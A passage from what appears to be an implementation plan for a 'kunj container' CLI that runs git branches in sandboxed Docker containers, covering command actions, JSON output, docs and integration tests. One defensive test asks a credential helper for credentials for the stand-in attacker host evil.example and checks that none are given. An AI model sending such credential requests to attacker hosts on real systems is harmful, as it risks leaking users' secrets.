Actions: `start | shell | exec | agent | attach | forward | list | stop | remove` (unknown → `Error("Unknown container action 'x'. Expected one of: …")`). `[branch]` resolution: target, else `getCurrentBranch()`, else (TTY, not json) an inquirer picker over `git branch -r` names (lazy import), else error. `exec` takes everything after `--` (Commander `passThroughOptions` + `allowUnknownOption` on this command). `agent` runs `backend.exec(id, ['tmux','new-session','-A','-s','agent', ...shellSplit(agentCommand), ...args], { tty: true, stdin: 'inherit', stdout: 'inherit', user })`; `attach` = `tmux attach -t agent`; `shell` = `exec` of `${SHELL in image: zsh if present else bash}` with `-l`. The backend is `new LocalDockerBackend({ context: options.context || config.container.dockerContext })`.

- `list --json` shape per spec *JSON* (phase-1 fields: no `services`; `ports` carry `kind: 'publish'`; `firewall: 'default' | 'allowlist'` from `kunj.options`); human output modelled on `WorktreeCommand.list` (branch, state, image, agent ●, ahead/dirty, ports). `--all` drops the `kunj.repo` filter.
- Text summaries after `start`: container name, image, branch, firewall mode, kept files copied (each on its own line, per spec), and the two next commands (`kunj ct agent <branch>`, `kunj ct shell <branch>`).
- Hooks: `pre/post-container-create` around `startContainer` and `pre/post-container-delete` around `removeContainer` via `runActionHook(name, { branch, container: names.container, image }, { hooks: config.hooks, jsonMode, skip: options.hooks === false })`.
- Errors: `StartError` and `HookError` printed without a stack (BaseCommand already does this for thrown errors); in json mode `{ error: { code, message } }` with `code` from `StartError.code` or `'error'`.

- [ ] **Step 1: Write the failing tests** — `shifts positionals like the worktree command` (`execute(options)` → list; `execute('start', 'feat', options)`); `rejects unknown actions`; `list json shape` with a mocked backend/lifecycle returning one running container → exact object with `backend.context: 'default'` and `workspace`/`agent` fields; `exec passes the args after --`.
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement container.ts; register in index.ts and fast.ts; add `aliases` support to `CommandConfig`.** Keep `import('inquirer')` lazy.
- [ ] **Step 4: Verify**: `npm test`, `npm run lint`, `npm run build`, then `time node dist/index.js container list --json` in this repo with Docker running → JSON within ~0.5 s and no AWS modules loaded (`node --cpu-prof` not needed; `NODE_DEBUG=module` grep for `@aws-sdk` must be empty).
- [ ] **Step 5: Commit** — `git commit -m "kunj container: sandboxed branch containers"`

---

### Task 11: Docs: README, CLAUDE.md, aj-log

**Files:**
- Modify: `README.md` (new `### Run a branch in a sandboxed container` section after *Keep files across worktrees*, with the typical flow from the spec, the token advice, and the "what is and is not protected" table)
- Modify: `CLAUDE.md` (new `## Branch Containers` section: modules, backend rule, naming, fast-path membership, `test:docker`)
- Modify: `aj-log.md` (entry for the implementation)

- [ ] **Step 1: Write the three sections.**
- [ ] **Step 2: `kunj container --help` output matches the README's command list** (run `node dist/index.js container --help`).
- [ ] **Step 3: Commit** — `git commit -m "Document kunj container"`

---

### Task 12: Docker integration tests

**Files:**
- Create: `src/lib/container/__tests__/integration.docker.test.ts`
- Modify: `jest.config.js` (`testPathIgnorePatterns: ['\\.docker\\.test\\.ts$']`), `package.json` (`"test:docker": "jest --testPathIgnorePatterns=/node_modules/ --testMatch='**/*.docker.test.ts' --runInBand"`)

Skipped as a whole (`describe.skip`) when `docker info` fails. Uses a temp bare repo served via `file://` as origin? — No: the container cannot reach the host filesystem. Serve it with `git daemon --export-all --base-path=<tmp> --port=<free> --enable=receive-pack` on the host and use `git://host.docker.internal:<port>/origin.git` with `container.network.allowHost: true` for the test config. Image: `kunj-sandbox:<version>` (built once by the first test; ~3 min cold).

- [ ] **Step 1: Write the tests**
  - `start clones the branch and seeds once` — `startContainer` then `exec git rev-parse --abbrev-ref HEAD` → branch; second `startContainer` → `seeded: false`.
  - `push from inside without -u reaches origin` — commit inside, `git push`, host `git ls-remote` shows the new sha.
  - `credential helper gives nothing to another host` — inside: `git -c credential.helper=/usr/local/bin/git-credential-kunj credential fill <<< "protocol=https\nhost=evil.example\n"` prints no `password=`.
  - `forward reaches a server bound to localhost in the container` — `exec python3 -m http.server 8123 --bind 127.0.0.1` in background; `forwardPort` → `fetch('http://127.0.0.1:<hostPort>/')` is 200.
  - `helper blocks the gateway in default mode` — `exec curl --max-time 3 http://host.docker.internal:<daemon port>/` fails (run this test with `allowHost: false` on a second container).
  - `allowlist blocks example.com` — third container with `network.allow: ['registry.npmjs.org']` → `curl https://example.com` fails, `curl https://registry.npmjs.org/` succeeds.
  - `remove refuses with a second unpushed branch, then removes with force and leaves nothing labelled` — `docker ps -a / volume ls / network ls --filter label=kunj.repo=<id>` all empty.
- [ ] **Step 2: Run** `npm run test:docker` → PASS (and `npm test` still excludes it and passes).
- [ ] **Step 3: Commit** — `git commit -m "Docker integration tests for kunj container"`

---

## Self-review notes

- Spec coverage: Decisions → Tasks 3–10; Image → 4, 6; Starting → 7, 8; Removing → 8; Credentials/settings → 2, 8; Network → 6 (script), 8 (env); Ports → 9; Hooks → 1, 2, 10; JSON/Errors → 10; Testing → each task + 12. Not covered by design: services, open, prune, DinD, `--auto` (phases 2–3).
- Type consistency: `ContainerNames`, `ContainerBackend`, `ExecIO`, `StartError.code`, `ContainerStatus.status` are defined once (Tasks 3, 5, 8) and used by name elsewhere.
- Review Focus 1–5 are pinned in Tasks 3, 4, 7/12, 8, 8.
